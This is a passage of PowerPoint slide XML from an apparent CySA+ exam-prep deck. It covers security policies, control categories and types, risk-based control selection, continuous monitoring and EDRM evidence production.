              <a:t>•  ITIL Continual Process</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Improvement</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_91e84d9b22.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6812280" y="1783080"/>
            <a:ext cx="4297680" cy="429768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833</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · POLICIES AND PROCEDURES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Policies and Procedures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Policies are high-level management statements of intent that set the rules and expectations for the organization, while procedures are the step-by-step instructions that carry those policies out in practice.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Common examples include a code of conduct and ethics statement, an acceptable use policy (AUP) defining permitted use of systems, a password policy setting complexity and rotation requirements, and data governance rules covering data ownership, data retention schedules, and work product retention for analyst deliverables.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts rely on these documents as the authority for their actions, because a finding is only enforceable and reportable when it can be tied back to a stated policy, and retention rules dictate how long logs and evidence must be kept.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: CySA+ tests your ability to match a scenario to the correct governing document, especially identifying which policy (AUP, password, data retention, ownership) a given control or violation maps to.</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834</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · POLICIES AND PROCEDURES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Policies and Procedures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Ethics and code of conduct</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Acceptable use policy (AUP)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Password policy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Data ownership</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Data retention</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Work product retention</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835</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · CONTROLS AND PROCEDURES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Controls Overview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Security controls are the safeguards that reduce risk, and they are commonly classified in two dimensions at once: by category and by function. The three categories describe how a control is implemented — administrative (policies and people), logical/technical (software and hardware enforcement), and physical (tangible barriers).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The three functional types describe what the control does relative to an incident — preventative controls stop it before it happens, detective controls identify it while or after it occurs, and corrective controls fix or restore afterward.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Understanding both dimensions lets an analyst reason about defense in depth, because a single asset should ideally be protected by controls spanning multiple categories and functions so no single failure leaves it exposed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam frequently asks you to classify a given control along both axes at once (for example, a firewall is a technical, preventative control), so knowing the category-by-function matrix is essential.</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836</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · CONTROLS AND PROCEDURES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Controls Overview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Administrative</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Logical/technical</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Physical</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  3 types in each</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Preventative</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Detective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Corrective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837</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · CONTROLS AND PROCEDURES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Controls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Controls are grouped by how they are administered: administrative controls are enforced by management through policies and procedures, such as the documented requirements a user must meet before being granted access to an information system, including background checks and training.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Logical or technical controls use software and hardware tools to restrict network or system access, such as firewalls, access control lists (ACLs), encryption, and authentication systems, with the goal of maintaining the confidentiality, integrity, and availability of resources.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Physical controls are tangible measures that deter or delay an attacker and protect facilities and equipment, such as locks, safes, walls, fences, mantraps, and guards, and analysts consider all three so that a control gap in one category can be compensated for in another.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: You will be asked to identify whether a specific safeguard is administrative, technical, or physical, so memorize representative examples of each (policies vs. firewalls/ACLs vs. locks/safes).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838</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · CONTROLS AND PROCEDURES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Controls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Administrative</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Administered by management via policies or procedures</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Ex: requirements for accessing information system</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Logical/technical</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Software/hardware tools to restrict network or system access</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Ex: firewalls, ACLs, etc</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Goal: maintain resources’ availability, integrity, &amp; confidentiality</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839</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · CONTROLS AND PROCEDURES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Controls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Physical</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Deter or delay an attacker</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Ex: safes, locks, walls, etc</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840</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · CONTROLS AND PROCEDURES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Control Types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Control types describe a control's function against the timeline of an incident. Preventative controls act before an event to stop it from happening at all, such as access control, hardening, and encryption that block unauthorized activity.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Detective controls act during or after an event to identify suspicious activity on the network, such as IDS/IPS alerts, SIEM correlation, log review, and audit trails that surface something is wrong.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Corrective controls act after detection to remediate an identified vulnerability or restore normal operation, such as patching, quarantining a host, or restoring from backup, and analysts layer all three so that if prevention fails, detection and correction still limit the damage.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions that give an example control and ask for its type, or that ask which type is needed to close a specific gap (for example, adding detective capability when a breach went unnoticed).</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841</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · CONTROLS AND PROCEDURES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Control Types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Preventative</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Prevent incident from happening</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Detective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Detect suspicious activity on the network</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Corrective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Correct an identified vulnerability</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842</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · CONTROLS AND PROCEDURES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Control Selection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Control selection is the process of choosing which controls to implement based on organizationally defined parameters, which come from both internal sources (the organization's own policies, standards, and risk appetite) and external sources (laws and governmental or industry regulations the organization must comply with).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The selection criteria are driven by a risk assessment that weighs the impact to the confidentiality, integrity, and availability of information resources against the organization's stated risk appetite, so that controls are proportionate to the risk they address.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts contribute to this process by supplying the vulnerability and threat data that feed the risk assessment, and by ensuring recommended controls satisfy both regulatory obligations and the organization's tolerance for residual risk.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam frames control selection as a risk-driven decision, so be ready to justify a control choice by referencing a risk assessment, CIA impact, regulatory requirements, and risk appetite rather than personal preference.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843</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · CONTROLS AND PROCEDURES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Control Selection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Organizationally Defined Parameters</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Internal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  External</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Governed by law or governmental regulations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Selection Criteria</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Driven by risk assessment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Confidentiality</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Integrity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Availability of information resources</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Organization’s risk appetite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844</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · CONTROLS AND PROCEDURES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Procedures Overview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This overview groups two operational procedures analysts perform. Continuous monitoring is the ongoing collection and analysis of security information, vulnerabilities, threats, and network trends to maintain situational awareness, and its purpose is to inform organizational risk decisions with current data rather than a stale point-in-time snapshot.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Evidence production is the procedure for responding to a legal request for documents, and it is commonly structured around the Electronic Discovery Reference Model (EDRM), whose early phases are identification (locating relevant electronically stored information), preservation (protecting it from alteration), collection (gathering it), and processing (reducing and converting it for review).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because continuous monitoring is the engine of proactive defense, and because a mishandled evidence request can spoil admissibility or expose the organization to legal risk if chain of custody and preservation are not followed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: CySA+ pairs continuous monitoring (as an input to risk decisions) with e-discovery/evidence handling, so know both the purpose of monitoring and the ordered EDRM phases.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845</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · CONTROLS AND PROCEDURES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Procedures Overview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Continuous monitoring</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Awareness of information security, vulnerability, threats, network trends</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Purpose: inform organizational risk decisions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846</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · CONTROLS AND PROCEDURES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Procedures Overview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Evidence production</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Legal request for documents</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  EDRM (Electronic Discovery Reference Model)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Identification</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
